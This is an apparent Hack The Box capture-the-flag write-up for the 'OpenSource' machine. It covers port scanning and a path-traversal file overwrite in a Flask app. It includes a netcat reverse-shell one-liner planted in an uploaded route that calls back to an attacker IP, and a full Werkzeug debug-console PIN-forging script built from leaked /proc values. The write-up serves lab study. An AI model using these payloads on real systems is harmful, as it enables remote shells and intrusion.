---
title: OpenSource
draft: false
tags:
---
![[Pasted image 20250225205639.png]]

Machine: https://app.hackthebox.com/machines/471

# Enumeration
## Services / Versions
- As always, we use [[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]] to get service and version of the target
```bash
 sudo nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.164 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250225210256.png]]

- And a version enumeration and run some common scripts
```bash
sudo nmap -p22,80 -sVC -Pn -n --min-rate 5000 10.10.11.164 -oN Targeted
```
>[!Example]- Result
>![[Pasted image 20250225210750.png]]

## Web Service Enumeration

- In order to get knowledge of the target, we can use some tools to get info about the technologies used in the web side 
### [[whatweb]] / [[wappanalyzer]]
```
whatweb http://<ip>
```
>[!example]- Result
>![[Pasted image 20250225225016.png]]
>![[Pasted image 20250225225051.png]]

### Web estructure
- so it using "werkzeug 2.1.2" we can try somethings like [bypass console PIN](https://www.daehee.com/blog/werkzeug-console-pin-exploit) because the Debug is enabled, but first we need to find a path traversal / LFI in order to get `uuid.getnode()` and `get_machine_id()` 
>[!example]- Result
>![[Pasted image 20250226152522.png]]

- we can upload our files to the service
>[!Example]- Result
>![[Pasted image 20250226153021.png]]

- The web allow us to download, what appears to be, que source code of the web application, so after reading the content we know:
	- Web applicaction is deployed in a docker container
	- User "root" is running the service
	- We know how the upload service works, and seem to be susceptible to FLI
>[!example]- Result
>![[Pasted image 20250226153247.png]]

- if we look closer we can see that there is a function named `get_file_name()` that came from `app.utils` so lets check it
>[!example]- Result
>![[Pasted image 20250226154154.png]]

- looks like is replacement the string `../` in order to avoid path traversal
>[!example]- Result
>![[Pasted image 20250226160227.png]]

# Docker Exploitation
## Inicial Access

- so we can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
>[!info]- Like this:
>`/route/to/path/public/uploads/MyFileName` 
>to
>`/MyfileName`

- We can change the file `view.py` to a custom file with a custom function like this, in order to get a [revershell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) (we know that the path is `/app/app/` because source code and a information leakage when we upload a wrong)
>[!info]- Information leakage
>![[Pasted image 20250226161724.png]]

```python
@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f")
```
>[!example]- Result
>![[Pasted image 20250226162527.png]]

- so if we research this new route `/shell` the python code while be executed
```bash
curl http://10.10.11.164/shell
```
>[!example]- Result
>![[Pasted image 20250226162830.png]]

- In order to get a better experience we can upgrade the tty using python (we use sh because there is no bash)
```bash
python3 -c 'import pty;pty.spawn("/bin/sh")'
ctrl + z
stty raw echo; fg
reset xterm
export PS1="\u@\h:\w\# "
export TERM=xterm-256color
```
> [!example]- Result
> ![[Pasted image 20250226163759.png]]

# Docker Breakout
- we are inside a docker so lets get out of here
>[!example]- Result
>![[Pasted image 20250226164003.png]]

- now we have all pieces to reproduce a PIN code to get access at debug console, first we need to get MAC address (In my case `2485377892359`)
```bash
cat /sys/class/net/eth0/address
python -c 'print(0x0242ac110007)'
```
>[!example]- Result
>![[Pasted image 20250226172041.png]]

- And get this value `/proc/sys/kernel/random/boot_id` in my case `e9630489-23dd-47bb-b05d-3250757832dc` and u have to append de value of `/proc/self/cgroup` (last slash)
```bash
cat /proc/sys/kernel/random/boot_id
cat /proc/self/cgroup
```
>[!example]- Result
>![[Pasted image 20250226172348.png]]
>![[Pasted image 20250226175135.png]]

- so the final code is this:
```python
import hashlib
from itertools import chain
probably_public_bits = [
	'root',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2485377892359',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'e9630489-23dd-47bb-b05d-3250757832dcd746c2d220c5026b8883a99ea419aa1ebbf18f6394ace10a42985ca7f4eca816'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```
>[!example]- Result
>![[Pasted image 20250226182056.png]]

- if we type de code doesnt works
>[!example]- Result
>![[Pasted image 20250226182130.png]]
>![[Pasted image 20250226182248.png]]

- This happend because de version of the application, we have to chain the encrypt mode to `sha1`, like this

```python
import hashlib
from itertools import chain
probably_public_bits = [
	'root',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
	'2485377892359',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'e9630489-23dd-47bb-b05d-3250757832dcd746c2d220c5026b8883a99ea419aa1ebbf18f6394ace10a42985ca7f4eca816'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```
